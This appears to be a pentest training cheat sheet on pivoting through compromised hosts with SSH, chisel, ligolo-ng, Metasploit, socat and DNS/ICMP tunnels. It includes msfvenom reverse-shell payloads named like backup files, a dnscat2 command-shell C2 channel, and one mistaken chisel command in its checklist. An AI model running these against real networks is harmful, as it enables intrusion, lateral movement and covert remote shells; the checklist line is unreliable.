# Pivoting, Tunneling & Port Forwarding

#Pivoting #Tunnel #Tunneling #PortForwarding #SOCKS #Chisel #Ligolo

## Core Concepts

| Term | Meaning |
|------|---------|
| **Pivot Host** / Beachhead / Jump Host | Compromised host used to reach other network segments |
| **Pivoting** | Using a compromised host to move laterally into other networks |
| **Tunneling** | Encapsulating traffic inside another protocol to bypass firewalls |
| **Lateral Movement** | Expanding access to additional hosts, apps, and services within a segment |
| **Port Forwarding** | Redirecting traffic from one port/host to another |
| **SOCKS4** | TCP proxy — no auth, no UDP |
| **SOCKS5** | TCP proxy — supports auth and UDP |
| **Transparent Proxy** | Intercepts traffic from non-proxy-aware tools and routes it through a tunnel |

---

## Network Enumeration (from pivot host)

```bash
# Linux
ip a                    # Interfaces and IPs
ip route                # Routing table — shows which subnets are reachable
cat /etc/hosts
arp -a                  # Adjacent hosts from ARP cache

# Windows
ipconfig /all
route print
arp -a
```

### Ping sweeps (discover hosts in internal subnet)

```bash
# Linux bash
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

# Windows CMD
for /L %i in (1,1,254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# Windows PowerShell
1..254 | % {"172.16.5.$($_): $(Test-Connection -Count 1 -ComputerName 172.16.5.$($_) -Quiet)"}

# Metasploit
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

---

## SSH Port Forwarding

### Local port forwarding (-L)

Forward a port on your local machine through SSH to a service on the remote side.

```bash
# Forward localhost:1234 → target:3306 (MySQL)
ssh -L 1234:localhost:3306 user@10.129.202.64

# Multiple ports
ssh -L 1234:localhost:3306 -L 8080:localhost:80 user@10.129.202.64

# Verify
nmap -v -sV -p1234 localhost
netstat -antp | grep 1234
```

### Dynamic port forwarding (-D) — SOCKS proxy

Creates a SOCKS proxy on your local machine — route all proxychains traffic through it.

```bash
ssh -D 9050 user@10.129.202.64
```

Then configure proxychains and use normally:

```bash
proxychains nmap -sT -Pn -p22,80,443 172.16.5.19
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### Remote / reverse port forwarding (-R)

Pivot host connects out to attacker and creates a reverse tunnel. Useful when you can't reach the pivot directly.

```bash
# Run on ATTACKER — tells pivot host to forward its port 9090 → attacker's port 9050
ssh -R <pivotIP>:9090:0.0.0.0:9050 ubuntu@<pivotIP> -vN
```

### SSH ProxyJump (-J)

Chain SSH through one or more jump hosts without setting up a tunnel manually.

```bash
# SSH directly to internal host via pivot
ssh -J user@10.129.202.64 user@172.16.5.19

# Multiple hops
ssh -J user@pivot1,user@pivot2 user@internal-host

# Use with SCP through a jump host
scp -J user@pivot /tmp/file user@172.16.5.19:/tmp/file
```

### SSH ProxyCommand (older alternative to -J)

```bash
ssh -o ProxyCommand="ssh -W %h:%p user@pivot" user@172.16.5.19
```

---

## ProxyChains

Forces non-proxy-aware tools to route through a SOCKS proxy.

### Config

```bash
sudo nano /etc/proxychains.conf
# Or:
sudo nano /etc/proxychains4.conf
```

Key settings:

```
# At the bottom — set your proxy
socks4  127.0.0.1 9050    # for SSH -D or Metasploit socks4a
socks5  127.0.0.1 1080    # for ligolo-ng, chisel, SOCKS5 proxies

# Optional — disable DNS leak protection if causing issues
# proxy_dns
```

```bash
# Verify tunnel is working
curl --socks5 127.0.0.1:1080 http://172.16.5.19

# Then use normally
proxychains nmap -sT -Pn -p22,80,443,3389 172.16.5.19
proxychains crackmapexec smb 172.16.5.0/24
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
proxychains firefox-esr http://172.16.5.135:80
```

> ProxyChains can be slow. Use `-sT` (TCP connect) with nmap — SYN scan doesn't work through proxies.

---

## Chisel

Fast TCP/UDP tunneling over HTTP, encrypted with SSH. One binary, works on Linux and Windows.

### Get binary

```bash
# Pre-built releases (recommended over building from source)
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz
mv chisel_linux_amd64 chisel
chmod +x chisel

# Transfer to pivot host
scp chisel user@10.129.202.64:~/
```

### Forward SOCKS (pivot hosts the server)

```bash
# Pivot host — run chisel server
./chisel server -v -p 1234 --socks5

# Attacker — connect and create SOCKS proxy on local port 1080
./chisel client -v 10.129.202.64:1234 socks
# Edit /etc/proxychains.conf: socks5 127.0.0.1 1080
```

### Reverse SOCKS (attacker hosts the server — preferred when pivot can't receive inbound)

```bash
# Attacker — run reverse server
sudo ./chisel server --reverse -v -p 1234 --socks5

# Pivot host — connect back to attacker
./chisel client -v 10.10.14.17:1234 R:socks
# Proxy on attacker at 127.0.0.1:1080
```

### Port forwarding with chisel

```bash
# Forward attacker port 8080 → internal target 172.16.5.19:80
./chisel client 10.129.202.64:1234 8080:172.16.5.19:80

# Reverse forward — internal target port accessible on attacker
./chisel client 10.10.14.17:1234 R:8080:172.16.5.19:80
```

---

## ligolo-ng

Modern reverse tunneling tool. Creates a TUN interface on the attacker — routed traffic goes directly through the tunnel without proxychains. Much faster than chisel + proxychains for scanning.

Two binaries: `proxy` (runs on attacker) and `agent` (runs on pivot).

### Setup — one time on attacker (Kali)

```bash
# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

### Get binaries

```bash
# Download from releases
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/proxy_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/agent_linux_amd64.tar.gz
tar -xzf proxy_linux_amd64.tar.gz
tar -xzf agent_linux_amd64.tar.gz

# Windows agent (for Windows pivot)
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/agent_windows_amd64.zip
```

### Start proxy on attacker

```bash
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

### Run agent on pivot host

```bash
# Linux pivot
./agent -connect 10.10.14.x:11601 -ignore-cert

# Windows pivot
.\agent.exe -connect 10.10.14.x:11601 -ignore-cert
```

### In the proxy console (after agent connects)

```
ligolo-ng » session                     # list sessions
ligolo-ng » session                     # select session (enter number)
[Agent] » start                         # start the tunnel
```

### Add route to internal subnet (attacker)

```bash
# Route traffic for internal subnet through the ligolo TUN interface
sudo ip route add 172.16.5.0/24 dev ligolo

# Verify
ip route show
ping 172.16.5.19       # direct ping — no proxychains needed
nmap -sV 172.16.5.19   # direct scan
```

### Double pivot with ligolo-ng (pivot → internal host → deeper subnet)

Add a listener on the pivot host that forwards to a third host:

```
[Agent] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
```

Run a second agent on the internal host, connecting to the pivot's listener:

```bash
./agent -connect 172.16.5.19:11601 -ignore-cert
```

Back in the proxy console — a new session appears. Select it, start it, add the new subnet route:

```bash
sudo ip route add 172.16.6.0/24 dev ligolo
```

---

## Metasploit Pivoting

### SOCKS proxy via Metasploit

```bash
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run -j

# Edit /etc/proxychains.conf: socks4 127.0.0.1 9050
```

### Autoroute (tell Metasploit to route subnet through a session)

```bash
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run

# Or from meterpreter session directly
run autoroute -s 172.16.5.0/23
run autoroute -p            # list active routes
```

### Port forwarding from meterpreter

```bash
# Forward: local 3300 → internal 172.16.5.19:3389
portfwd add -l 3300 -p 3389 -r 172.16.5.19

# Reverse forward: internal host port 1234 → attacker 8081
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

### Multi/handler for reverse shell through pivot

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 8081
set LHOST 0.0.0.0
run
```

### Msfvenom — staged payloads for pivoting

```bash
# Windows reverse — connects back through pivot
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 LPORT=1234 -f exe -o backupscript.exe

# Linux reverse
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=8080 -f elf -o backupjob

# Bind shell on victim (attacker connects to victim)
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8443 -f exe -o backupscript.exe
```

---

## Socat (port relay)

Useful on a pivot host to forward traffic without SSH.

```bash
# Pivot listens on 8080, forwards to attacker:80
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# Pivot listens on 8080, forwards to internal:8443
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

---

## sshuttle

Python transparent proxy — creates iptables rules on attacker to route a subnet through SSH. No proxychains needed.

```bash
sudo apt-get install sshuttle

# Route 172.16.5.0/23 through SSH to pivot
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v

# Multiple subnets
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 10.10.10.0/24 -v
```

> Direct scans work without proxychains — sshuttle handles routing transparently.

---

## rpivot

Python SOCKS4 proxy — useful when other tools aren't available.

```bash
git clone https://github.com/klsecservices/rpivot.git

# Attacker — start server (proxy on 9050, pivot connects on 9999)
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Transfer client to pivot host, then run:
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

# Use via proxychains
proxychains firefox-esr 172.16.5.135:80
```

---

## Windows Pivoting Tools

### Netsh portproxy (built-in)

```cmd
# Pivot listens on 8080, forwards to internal host:3389
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25

# Verify
netsh.exe interface portproxy show v4tov4

# Connect from attacker via RDP through pivot
xfreerdp /v:10.129.15.150:8080 /u:victor /p:pass@123

# Cleanup
netsh.exe interface portproxy delete v4tov4 listenport=8080 listenaddress=10.129.15.150
```

### Plink (Windows SSH client — PuTTY CLI)

```cmd
plink -ssh -D 9050 ubuntu@10.129.15.50
```

### SocksOverRDP (pivot through RDP sessions)

Uses RDP Dynamic Virtual Channels to tunnel SOCKS through an existing RDP session.

```
1. RDP into pivot host:
   xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

2. On pivot host — register plugin:
   regsvr32.exe SocksOverRDP-Plugin.dll

3. From pivot host — RDP into internal host (plugin activates automatically)

4. On internal host — run server as admin:
   SocksOverRDP-Server.exe

5. Verify SOCKS listening on pivot (static port 1080):
   netstat -antb | findstr 1080

6. Configure Proxifier on pivot host → 127.0.0.1:1080
```

---

## DNS Tunneling (dnscat2)

Covert C2 channel over DNS. Bypasses firewalls that only allow DNS traffic.

```bash
# Attacker — start server
git clone https://github.com/iagox86/dnscat2.git
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

# Windows pivot — PowerShell client
git clone https://github.com/lukebaggett/dnscat2-powershell.git
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <key> -Exec cmd

# In dnscat2 server — drop to CMD shell
window -i 1
```

---

## ICMP Tunneling (ptunnel-ng)

Encapsulates TCP inside ICMP echo packets. Bypasses firewalls that block all TCP/UDP but allow ping.

```bash
# Transfer to pivot host
scp -r ptunnel-ng ubuntu@10.129.202.64:~/

# Pivot host — start server
sudo ./ptunnel-ng -r10.129.202.64 -R22

# Attacker — connect through ICMP tunnel
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

# Now SSH through the ICMP tunnel → creates SOCKS proxy
ssh -D 9050 -p2222 -l ubuntu 127.0.0.1

# Use via proxychains
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

---

## Double Pivot — Scenario Overview

Goal: Attacker → Pivot1 → Pivot2 → Internal target (three hops)

### With ligolo-ng (recommended)

```bash
# 1. Attacker — setup TUN, start proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# 2. Pivot1 — run agent back to attacker
./agent -connect 10.10.14.x:11601 -ignore-cert

# 3. Attacker proxy console — start session, add Pivot1's internal subnet
session → start
sudo ip route add 172.16.5.0/24 dev ligolo

# 4. Pivot1 proxy console — add listener so Pivot2 can connect through Pivot1
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601

# 5. Transfer agent to Pivot2 (reachable via 172.16.5.x now)
# Pivot2 — run agent, connect to Pivot1's listener
./agent -connect 172.16.5.19:11601 -ignore-cert

# 6. Attacker proxy console — new session appears, start it, add Pivot2's internal subnet
session → start
sudo ip route add 172.16.6.0/24 dev ligolo
```

### With SSH -J (simpler for SSH-only chains)

```bash
ssh -J user@pivot1,user@pivot2 user@172.16.6.10
```

### With nested SSH tunnels (manual)

```bash
# On attacker — forward local 8022 → pivot1:22
ssh -L 8022:pivot2:22 user@pivot1 -N

# Then in another terminal — SSH to pivot2 via the forwarded port
ssh -p 8022 user@localhost -D 9050 -N

# Now proxychains routes through pivot1 → pivot2
```

---

## Tool Selection Guide

| Scenario | Recommended tool |
|----------|----------------|
| Quick SOCKS proxy, Linux pivot | `ssh -D` + proxychains |
| Fast scanning through pivot | ligolo-ng (TUN interface, no proxychains) |
| HTTP(S) traversal only, good OPSEC | chisel (reverse) |
| Windows pivot, no SSH | netsh, Plink, or chisel Windows binary |
| Multiple network hops | ligolo-ng (listener_add) or SSH -J |
| Firewall blocks all but DNS | dnscat2 |
| Firewall blocks all but ICMP | ptunnel-ng |
| Transparent routing without proxychains | sshuttle |
| Pivoting already in Metasploit session | autoroute + socks_proxy |

---

## Quick Reference Checklist

```
INITIAL RECON FROM PIVOT
[ ] ip a / ifconfig — find additional interfaces/subnets
[ ] ip route / netstat -r — routing table
[ ] arp -a — cached adjacent hosts
[ ] Ping sweep internal subnet(s)

SSH TUNNELING
[ ] ssh -D 9050 <pivot> → dynamic SOCKS, configure proxychains
[ ] ssh -L <local>:<target>:<port> <pivot> → single port forward
[ ] ssh -R <pivot_port>:0.0.0.0:<local_port> <pivot> → reverse tunnel
[ ] ssh -J <pivot> <internal> → ProxyJump direct access

LIGOLO-NG (preferred for scanning)
[ ] Create TUN interface once: ip tuntap add user $(whoami) mode tun ligolo
[ ] sudo ./proxy -selfcert -laddr 0.0.0.0:11601
[ ] ./agent -connect <attacker>:11601 -ignore-cert
[ ] session → start in proxy console
[ ] sudo ip route add <subnet> dev ligolo
[ ] For double pivot: listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601

CHISEL
[ ] Reverse: sudo ./proxy server --reverse -v -p 1234 --socks5 (attacker)
[ ] ./chisel client <attacker>:1234 R:socks (pivot)
[ ] Configure proxychains: socks5 127.0.0.1 1080

METASPLOIT
[ ] use auxiliary/server/socks_proxy → background SOCKS
[ ] use post/multi/manage/autoroute → route subnet through session
[ ] portfwd add → single port forward from meterpreter

WINDOWS PIVOT
[ ] netsh portproxy → built-in, no extra tools
[ ] Plink → PuTTY SSH SOCKS proxy
[ ] chisel Windows binary → same as Linux
```
